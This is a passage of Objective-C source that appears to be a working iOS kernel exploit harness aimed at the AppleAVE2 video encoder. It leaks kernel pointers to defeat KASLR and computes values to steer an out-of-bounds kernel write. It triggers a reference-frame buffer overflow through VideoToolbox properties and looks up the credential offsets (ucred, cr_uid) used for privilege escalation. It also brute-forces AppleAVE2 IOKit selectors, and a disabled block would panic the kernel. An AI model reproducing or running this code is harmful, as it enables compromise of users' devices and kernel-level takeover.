        0xfffffff0082fc000ULL, // __TEXT_EXEC
        0xfffffff00b284000ULL, // __DATA
    };
    uint32_t slideCandidates[64] = {0};
    int slideCounts[64] = {0};
    int candidateCount = 0;
    int totalKptrs = 0;
    vm_address_t kaddr = 0;
    vm_size_t ksize = 0;
    uint32_t kdepth = 0;
    vm_region_submap_info_data_64_t kinfo;
    mach_msg_type_number_t kcount = VM_REGION_SUBMAP_INFO_COUNT_64;
    for (int iter = 0; iter < 256; iter++) {
        kcount = VM_REGION_SUBMAP_INFO_COUNT_64;
        kern_return_t kr = vm_region_recurse_64(mach_task_self(), &kaddr, &ksize, &kdepth,
                                                 (vm_region_recurse_info_t)&kinfo, &kcount);
        if (kr != KERN_SUCCESS || ksize == 0) break;
        if (kinfo.is_submap) { kdepth++; continue; }
        if ((kinfo.protection & (VM_PROT_READ | VM_PROT_WRITE)) == (VM_PROT_READ | VM_PROT_WRITE) &&
            ksize <= 16 * 1024 * 1024 &&
            !KPVMShouldSkipRegion(&kinfo, kaddr, ksize, &totalKptrs, NULL, NULL, 0)) {
            uint64_t *p = (uint64_t *)kaddr;
            size_t words = ksize / 8;
            for (size_t i = 0; i < words && i < 4096; i++) {
                uint64_t v = *(p + i);
                if (KPIsKernelPointerCandidate(v) && !KPIsKnownDiagnosticConstant(v)) {
                    totalKptrs++;
                    uint64_t untagged = 0;
                    if (!KPIsPlausibleKernelText(v, &untagged)) continue;
                    for (int b = 0; b < 4; b++) {
                        if (untagged <= kStaticBases[b]) continue;
                        uint64_t slide = untagged - kStaticBases[b];
                        if ((slide & 0x3FFF) == 0 && slide < (1024ULL << 20)) {
                            int found = 0;
                            for (int c = 0; c < candidateCount; c++) {
                                if (slideCandidates[c] == (uint32_t)slide) {
                                    slideCounts[c]++;
                                    found = 1;
                                    break;
                                }
                            }
                            if (!found && candidateCount < 64) {
                                slideCandidates[candidateCount] = (uint32_t)slide;
                                slideCounts[candidateCount] = 1;
                                candidateCount++;
                            }
                        }
                    }
                }
            }
        }
        kaddr += ksize;
    }
    [report appendFormat:@"  kernel pointers: %d\n", totalKptrs];
    int bestIdx = -1, bestCnt = 0;
    for (int c = 0; c < candidateCount; c++) {
        if (slideCounts[c] > bestCnt) { bestCnt = slideCounts[c]; bestIdx = c; }
    }
    if (bestIdx >= 0) {
        uint32_t slide = slideCandidates[bestIdx];
        uint64_t kbase = 0xfffffff007004000ULL + slide;
        [report appendFormat:@"  KASLR slide = 0x%x (hits=%d)\n", slide, bestCnt];
        [report appendFormat:@"  Kernel base = 0x%llx\n", kbase];

        // Compute NTL values that steer write into kernel range
        [report appendString:@"\n--- NTL steering (kernel range writes) ---\n"];
        [report appendString:@"x0 = ((NTL-16463) << 32) | 0x59\n"];
        [report appendString:@"NTL=1 -> 0xffffbfb200000059; NTL=16447 -> 0xfffffff000000059\n"];
        // NTL=1:     (-16462 << 32) | 0x59 = 0xffffbfb200000059
        // NTL=16447: (-16 << 32)    | 0x59 = 0xfffffff000000059
        int steerVals[] = { 1, 2, 3, 100, 1000, 8000, 16000, 16447, 16455, 16462 };
        for (int i = 0; i < 10; i++) {
            int ntl = steerVals[i];
            int64_t idx = (int64_t)ntl - 16463;
            uint64_t x0 = ((uint64_t)idx << 32) | 0x59;
            [report appendFormat:@"  NTL=%-5d -> x0=0x%016llx\n", ntl, x0];
        }
    }

    // === IOSurface kernel write detection (dlopen pattern) ===
    [report appendString:@"\n--- IOSurface kernel write detection ---\n"];
    void *isLib = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (isLib) {
        typedef void *(*ISCreateFn)(CFDictionaryRef);
        typedef int (*ISLockFn)(void *, uint32_t, void *);
        typedef int (*ISUnlockFn)(void *, uint32_t, void *);
        typedef void *(*ISGetBaseFn)(void *);
        typedef size_t (*ISGetSizeFn)(void *);
        ISCreateFn isCreate = (ISCreateFn)dlsym(isLib, "IOSurfaceCreate");
        ISLockFn isLock = (ISLockFn)dlsym(isLib, "IOSurfaceLock");
        ISUnlockFn isUnlock = (ISUnlockFn)dlsym(isLib, "IOSurfaceUnlock");
        ISGetBaseFn isGetBase = (ISGetBaseFn)dlsym(isLib, "IOSurfaceGetBaseAddress");
        ISGetSizeFn isGetSize = (ISGetSizeFn)dlsym(isLib, "IOSurfaceGetAllocSize");
        if (isCreate && isLock && isUnlock && isGetBase) {
            NSDictionary *surfProps = @{
                @"IOSurfaceWidth": @64,
                @"IOSurfaceHeight": @64,
                @"IOSurfaceBytesPerElement": @4,
                @"IOSurfacePixelFormat": @0x42475241,
            };
            void *surf = isCreate((__bridge CFDictionaryRef)surfProps);
            if (surf) {
                isLock(surf, 0, NULL);
                void *surfBase = isGetBase(surf);
                size_t surfSize = isGetSize ? isGetSize(surf) : 64*64*4;
                memset(surfBase, 0x41, surfSize);
                uint32_t *p32 = (uint32_t *)surfBase;
                for (int i = 0; i < 16; i++) p32[i] = 0xDEAD0000 + i;
                isUnlock(surf, 0, NULL);
                [report appendFormat:@"  IOSurface: %zu bytes at %p\n", surfSize, surfBase];
                // Read back
                isLock(surf, 0, NULL);
                uint32_t *check = (uint32_t *)isGetBase(surf);
                int kw = 0;
                for (int i = 0; i < 16; i++) {
                    if (check[i] != 0xDEAD0000 + i) {
                        [report appendFormat:@"  CHANGED [%d]: 0x%08x\n", i, check[i]];
                        kw++;
                    }
                }
                isUnlock(surf, 0, NULL);
                [report appendFormat:@"  kernel writes detected: %d\n", kw];
            } else {
                [report appendString:@"  IOSurfaceCreate returned NULL\n"];
            }
        } else {
            [report appendFormat:@"  dlsym failed: create=%p lock=%p\n", isCreate, isLock];
        }
    } else {
        [report appendString:@"  dlopen IOSurface failed\n"];
    }

    // === UserDPB overflow trigger (AVE27 stage12) ===
    [report appendString:@"\n--- UserDPB overflow trigger ---\n"];

    VTCompressionSessionRef sDPB = NULL;
    OSStatus stDPB = VTCompressionSessionCreate(
        kCFAllocatorDefault, 640, 480, kCMVideoCodecType_HEVC,
        NULL, NULL, NULL, NULL, NULL, &sDPB);
    if (stDPB != noErr || !sDPB) {
        [report appendFormat:@"  session create: %d\n", (int)stDPB];
    } else {
        // EncoderUsage=1
        int usage = 1;
        CFNumberRef nu = CFNumberCreate(NULL, kCFNumberIntType, &usage);
        VTSessionSetProperty(sDPB, CFSTR("EncoderUsage"), nu);
        CFRelease(nu);

        // EnableUserRefForFacetime=BOOLEAN true (+ RPS gate, ollie)
        OSStatus stRef = VTSessionSetProperty(sDPB, CFSTR("EnableUserRefForFacetime"), kCFBooleanTrue);
        [report appendFormat:@"  EnableUserRefForFacetime=YES -> %d\n", (int)stRef];
        OSStatus stRef2 = VTSessionSetProperty(sDPB, CFSTR("EnableUserRPSForFaceTime"), kCFBooleanTrue);
        [report appendFormat:@"  EnableUserRPSForFaceTime=YES -> %d\n", (int)stRef2];

        // Encode FIRST frame to initialize encoder (AVE27 stage12 order)
        VTSessionSetProperty(sDPB, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanTrue);
        OSStatus stPrep = VTCompressionSessionPrepareToEncodeFrames(sDPB);
        [report appendFormat:@"  prepare -> %d\n", (int)stPrep];

        if (stPrep == noErr) {
            // First encode (initialize)
            CVPixelBufferRef pb0 = NULL;
            CVPixelBufferCreate(kCFAllocatorDefault, 640, 480, kCVPixelFormatType_32BGRA, NULL, &pb0);
            if (pb0) {
                CVPixelBufferLockBaseAddress(pb0, 0);
                memset(CVPixelBufferGetBaseAddress(pb0), 0x80, CVPixelBufferGetDataSize(pb0));
                CVPixelBufferUnlockBaseAddress(pb0, 0);
                VTEncodeInfoFlags f0 = 0;
                OSStatus stE0 = VTCompressionSessionEncodeFrame(sDPB, pb0, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, &f0);
                [report appendFormat:@"  encode[0] (init) -> %d\n", (int)stE0];
                CVPixelBufferRelease(pb0);
            }

            // NOW set UserDPBFramesForFaceTime=24 (after init).
            // Per ollie: the property demands CFArray (kVTParameterErr -12900 on
            // a CFNumber; readback=array(0) proved the type). 24 slots overflow
            // the standard 16-slot DPB pool in AppleAVE2.
            NSMutableArray *dpbArray = [NSMutableArray arrayWithCapacity:24];
            for (int i = 0; i < 24; i++) {
                [dpbArray addObject:@{
                    @"FrameIndex": @(i),
                    @"PicOrderCnt": @(i * 2),
                    @"IsLongTerm": @(NO),
                    @"SlotIndex": @(i & 0x1F)
                }];
            }
            OSStatus stFrames = VTSessionSetProperty(sDPB, CFSTR("UserDPBFramesForFaceTime"),
                                                     (__bridge CFArrayRef)dpbArray);
            [report appendFormat:@"  UserDPBFramesForFaceTime=array[24] (after init) -> %d\n", (int)stFrames];

            // ollie: DPB slot threshold sweep like the OOL probe (borders 15/16/17)
            uint32_t dpbLastOK = 0, dpbFirstReject = 0;
            for (uint32_t n2 = 1; n2 <= 24; n2++) {
                NSMutableArray *arr = [NSMutableArray arrayWithCapacity:n2];
                for (uint32_t i2 = 0; i2 < n2; i2++) {
                    [arr addObject:@{
                        @"FrameIndex": @(i2), @"PicOrderCnt": @(i2 * 2),
                        @"IsLongTerm": @(NO), @"SlotIndex": @(i2 & 0x1F)
                    }];
                }
                OSStatus stA = VTSessionSetProperty(sDPB, CFSTR("UserDPBFramesForFaceTime"),
                                                    (__bridge CFArrayRef)arr);
                if (stA == 0) dpbLastOK = n2;
                else if (dpbFirstReject == 0) dpbFirstReject = n2;
            }
            [report appendFormat:@"  DPB array threshold: last_ok=%u first_rejection=%u\n",
             dpbLastOK, dpbFirstReject];

            // DPBRequirements
            NSMutableArray *dpbReq = [NSMutableArray array];
            for (int i = 0; i < 24; i++) [dpbReq addObject:@(i)];
            OSStatus stReq = VTSessionSetProperty(sDPB, CFSTR("DPBRequirements"), (__bridge CFArrayRef)dpbReq);
            [report appendFormat:@"  DPBRequirements(24) -> %d\n", (int)stReq];

            // Encode more frames
            for (int i = 1; i < 4; i++) {
                CVPixelBufferRef pbD = NULL;
                CVPixelBufferCreate(kCFAllocatorDefault, 640, 480, kCVPixelFormatType_32BGRA, NULL, &pbD);
                if (!pbD) continue;
                CVPixelBufferLockBaseAddress(pbD, 0);
                memset(CVPixelBufferGetBaseAddress(pbD), 0x80, CVPixelBufferGetDataSize(pbD));
                CVPixelBufferUnlockBaseAddress(pbD, 0);
                VTEncodeInfoFlags fD = 0;
                OSStatus stE = VTCompressionSessionEncodeFrame(sDPB, pbD, CMTimeMake(i, 30), kCMTimeInvalid, NULL, NULL, &fD);
                [report appendFormat:@"  encode[%d] -> %d\n", i, (int)stE];
                CVPixelBufferRelease(pbD);
            }
        }

        // Readback (check type before converting!)
        CFTypeRef rb = NULL;
        VTSessionCopyProperty(sDPB, CFSTR("UserDPBFramesForFaceTime"), NULL, &rb);
        if (rb) {
            CFTypeID t = CFGetTypeID(rb);
            if (t == CFNumberGetTypeID()) {
                int v = 0;
                CFNumberGetValue((CFNumberRef)rb, kCFNumberIntType, &v);
                [report appendFormat:@"  readback UserDPBFramesForFaceTime=%d (number)\n", v];
            } else if (t == CFArrayGetTypeID()) {
                [report appendFormat:@"  readback UserDPBFramesForFaceTime=array(%ld)\n", (long)CFArrayGetCount((CFArrayRef)rb)];
            } else {
                [report appendFormat:@"  readback UserDPBFramesForFaceTime=type(%lu)\n", (unsigned long)t];
            }
            CFRelease(rb);
        }
        CFTypeRef rb2 = NULL;
        VTSessionCopyProperty(sDPB, CFSTR("EnableUserRefForFacetime"), NULL, &rb2);
        if (rb2) {
            CFTypeID t2 = CFGetTypeID(rb2);
            if (t2 == CFNumberGetTypeID()) {
                int v2 = 0;
                CFNumberGetValue((CFNumberRef)rb2, kCFNumberIntType, &v2);
                [report appendFormat:@"  readback EnableUserRefForFacetime=%d\n", v2];
            } else if (t2 == CFBooleanGetTypeID()) {
                [report appendFormat:@"  readback EnableUserRefForFacetime=%d (bool)\n", (int)CFBooleanGetValue((CFBooleanRef)rb2)];
            } else {
                [report appendFormat:@"  readback EnableUserRefForFacetime=type(%lu)\n", (unsigned long)t2];
            }
            CFRelease(rb2);
        }

        VTCompressionSessionCompleteFrames(sDPB, kCMTimeInvalid);
        CFRelease(sDPB);
    }

    // === UserDPB element schema probe (analyst) ===
    // last_ok=0/first_rejection=1 means the validator rejects the ELEMENT
    // structure, not the array length. Candidates: CFNumber token, CFData blob,
    // dicts with POC/Slot / FrameID / Index â€” fed both via VTSessionSetProperty
    // AND via frameProperties. The encode callback dumps the sample-buffer
    // attachments â€” those are the reference-frame tokens the parser wants back.
    [report appendString:@"\n--- UserDPB element schema probe ---\n"];
    NSMutableArray *cbSink = [NSMutableArray array];
    NSDictionary *encSpec = @{
        @"EncoderUsage": @1,
        @"EnableUserRefForFacetime": @YES,
    };
    VTCompressionSessionRef sS = NULL;
    OSStatus stS = VTCompressionSessionCreate(
        kCFAllocatorDefault, 1280, 720, kCMVideoCodecType_HEVC,
        (__bridge CFDictionaryRef)encSpec, NULL, NULL,
        KPH9AttsCB, (__bridge void *)cbSink, &sS);
    [report appendFormat:@"create with encSpec(EncoderUsage+EnableUserRef) -> %d\n", (int)stS];
    if (stS == noErr && sS) {
        VTSessionSetProperty(sS, CFSTR("EnableUserRefForFacetime"), kCFBooleanTrue);
        OSStatus prepS = VTCompressionSessionPrepareToEncodeFrames(sS);
        CVPixelBufferRef pbS = NULL;
        CVPixelBufferCreate(kCFAllocatorDefault, 1280, 720,
                            kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, NULL, &pbS);
        OSStatus stE0 = -1;
        if (pbS) {
            stE0 = VTCompressionSessionEncodeFrame(sS, pbS, CMTimeMake(0, 30), kCMTimeInvalid,
                                                   NULL, NULL, NULL);
            VTCompressionSessionCompleteFrames(sS, kCMTimeInvalid);
        }
        [report appendFormat:@"prepare=%d encode[0] IDR -> %d\n", (int)prepS, (int)stE0];
        for (NSString *line in cbSink) {
            [report appendFormat:@"  %@\n", line];
        }
        [cbSink removeAllObjects];

        uint64_t z8 = 0;
        uint8_t z32[32] = {0};
        NSMutableArray *cands = [NSMutableArray array];
        [cands addObject:@[ @0 ]];                                                  // CFNumber(0)
        [cands addObject:@[ @1 ]];                                                  // CFNumber(1)
        [cands addObject:@[ [NSData dataWithBytes:&z8 length:8] ]];                  // CFData 8B
        [cands addObject:@[ [NSData dataWithBytes:z32 length:32] ]];                 // CFData 32B
        [cands addObject:@[ @{@"POC": @0, @"Slot": @0} ]];                          // Dict POC/Slot
        [cands addObject:@[ @{@"FrameID": @0, @"LT": @NO} ]];                       // Dict FrameID
        [cands addObject:@[ @{@"Index": @0} ]];                                     // Dict Index
        [cands addObject:@[ @{@"FrameIndex": @0, @"PicOrderCnt": @0,
                              @"IsLongTerm": @NO, @"SlotIndex": @0} ]];             // our dict
        for (NSUInteger ci = 0; ci < cands.count; ci++) {
            NSArray *arr = cands[ci];
            OSStatus sProp = VTSessionSetProperty(sS, CFSTR("UserDPBFramesForFaceTime"),
                                                  (__bridge CFTypeRef)arr);
            NSDictionary *frameProps = @{ @"UserDPBFramesForFaceTime": arr };
            OSStatus fProp = -1;
            if (pbS) {
                fProp = VTCompressionSessionEncodeFrame(sS, pbS,
                                                        CMTimeMake((int64_t)(ci + 1), 30),
                                                        kCMTimeInvalid,
                                                        (__bridge CFDictionaryRef)frameProps,
                                                        NULL, NULL);
                VTCompressionSessionCompleteFrames(sS, kCMTimeInvalid);
            }
            [report appendFormat:@"  cand[%lu] sessionSet=%d frameEncode=%d\n",
             (unsigned long)ci, (int)sProp, (int)fProp];
        }
        for (NSString *line in cbSink) {
            [report appendFormat:@"  %@\n", line];
        }
        if (pbS) CVPixelBufferRelease(pbS);
        VTCompressionSessionInvalidate(sS);
        CFRelease(sS);
    }

    // === stage9 PANIC RUNG â€” DISABLED ===
    // To enable: uncomment the block below
    // [report appendString:@"\n--- stage9: PANIC RUNG (NTL=16463) ---\n"];
    // VTCompressionSessionRef s9 = NULL;
    // VTCompressionSessionCreate(kCFAllocatorDefault, 640, 480, kCMVideoCodecType_HEVC, NULL, NULL, NULL, NULL, NULL, &s9);
    // if (s9) {
    //     int usage = 1, ntl = 16463;
    //     CFNumberRef n9;
    //     n9 = CFNumberCreate(NULL, kCFNumberIntType, &usage); VTSessionSetProperty(s9, CFSTR("EncoderUsage"), n9); CFRelease(n9);
    //     n9 = CFNumberCreate(NULL, kCFNumberIntType, &ntl); VTSessionSetProperty(s9, CFSTR("NumberOfTemporalLayers"), n9); CFRelease(n9);
    //     VTCompressionSessionPrepareToEncodeFrames(s9);
    //     CVPixelBufferRef pb9 = NULL;
    //     CVPixelBufferCreate(kCFAllocatorDefault, 640, 480, kCVPixelFormatType_32BGRA, NULL, &pb9);
    //     if (pb9) {
    //         VTEncodeInfoFlags f9 = 0;
    //         VTCompressionSessionEncodeFrame(s9, pb9, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, &f9);
    //         CVPixelBufferRelease(pb9);
    //     }
    //     CFRelease(s9);
    // }

    // === Filtered heap-shaped candidate audit ===
    [report appendString:@"\n--- Filtered candidate audit ---\n"];
    [report appendString:@"Offsets: p_pid=0x60 p_proc_ro=0x18 p_ucred=0x28 cr_uid=0x18\n"];

    uint32_t myPid = (uint32_t)getpid();
    [report appendFormat:@"  our pid: %u\n", myPid];

    NSMutableArray *kptrs2 = [NSMutableArray array];
    vm_address_t sAddr = 0;
    vm_size_t sSize = 0;
    uint32_t sDepth = 0;
    vm_region_submap_info_data_64_t sInfo;
    mach_msg_type_number_t sCnt = VM_REGION_SUBMAP_INFO_COUNT_64;

    while (1) {
        sAddr = (sAddr == 0) ? 0 : sAddr + sSize;
        sCnt = VM_REGION_SUBMAP_INFO_COUNT_64;
        if (vm_region_recurse_64(mach_task_self(), &sAddr, &sSize, &sDepth,
                                  (vm_region_recurse_info_t)&sInfo, &sCnt) != KERN_SUCCESS || sSize == 0) break;
        if (sInfo.is_submap) { sDepth++; continue; }
        if ((sInfo.protection & (VM_PROT_READ | VM_PROT_WRITE)) == (VM_PROT_READ | VM_PROT_WRITE) &&
            sSize <= 16 * 1024 * 1024 &&
            !KPVMShouldSkipRegion(&sInfo, sAddr, sSize, &sDepth, NULL, NULL, 0)) {
            uint64_t *p = (uint64_t *)sAddr;
            size_t words = sSize / 8;
            for (size_t i = 0; i < words && i < 8192; i++) {
                uint64_t v = *(p + i);
                if (KPIsKernelPointerCandidate(v) && !KPIsKnownDiagnosticConstant(v)) {
                    [kptrs2 addObject:@(v)];
                }
            }
        }
    }
    [report appendFormat:@"  filtered candidates: %lu\n", (unsigned long)kptrs2.count];

    int checked = 0;
    static const char *kClsNames[] = { "PACKED_INT32", "BAD_TBI", "UNALIGNED", "ZONE_HEAP", "TEXT_DATA" };
    for (NSNumber *kpNum in kptrs2) {
        uint64_t kaddr = kpNum.unsignedLongLongValue;
        if (checked > 500) break;
        checked++;

        // Per 120328 analysis: classify every candidate â€” the 0xffffffe0..ef
        // band (old "heap" check) is LE int32 pairs from codec tables.
        kptr_class_t cls = KPClassifyKPtr(kaddr);
        if (checked <= 20) {
            [report appendFormat:@"  candidate[%d]: raw=0x%llx %s\n", checked, kaddr, kClsNames[cls]];
        }
    }

    [report appendString:@"  candidate scan complete (unverified without kernel oracle)\n"];

    // === AVE2 userclient probe: direct IOKit path around the VT clamp ===
    [report appendString:@"\n--- AVE2 userclient probe (direct IOKit) ---\n"];
    kp_io_service_t svc = IOServiceGetMatchingService(0, IOServiceMatching("AppleAVE2"));
    [report appendFormat:@"AppleAVE2 service=%u\n", svc];
    if (svc) {
        kp_io_connect_t conn = 0;
        kern_return_t ok = IOServiceOpen(svc, (unsigned int)mach_task_self(), 0, &conn);
        [report appendFormat:@"IOServiceOpen -> %d (conn=%u)\n", ok, conn];
        if (ok == KERN_SUCCESS) {
            uint64_t scalarIn = 16463;
            for (uint32_t sel = 0; sel <= 32; sel++) {
                uint64_t outVal = 0;
                uint32_t outCnt = 1;
                kern_return_t km = IOConnectCallMethod(conn, sel, &scalarIn, 1,
                                                       NULL, 0, &outVal, &outCnt, NULL, NULL);
                uint64_t structIn[4] = { 16463, 1, 0x59, 0 };
                uint8_t structOut[64] = {0};
                size_t structOutSz = sizeof(structOut);
                kern_return_t ks = IOConnectCallStructMethod(conn, sel, structIn, sizeof(structIn),
                                                             structOut, &structOutSz);
                // Log everything except the plain "no such selector" noise pair
                if (km != (kern_return_t)0xe00002c2 && ks != (kern_return_t)0xe00002c2) {
                    [report appendFormat:@"  sel=%-2u method=%d out=0x%llx | struct=%d outSz=%zu\n",
                     sel, km, outVal, ks, structOutSz];
                }
            }
            IOServiceClose(conn);
        }
        IOObjectRelease(svc);
    } else {
        [report appendString:@"AppleAVE2 userclient not exposed to this process (sandbox)\n"];
    }
    return report;
}

@end
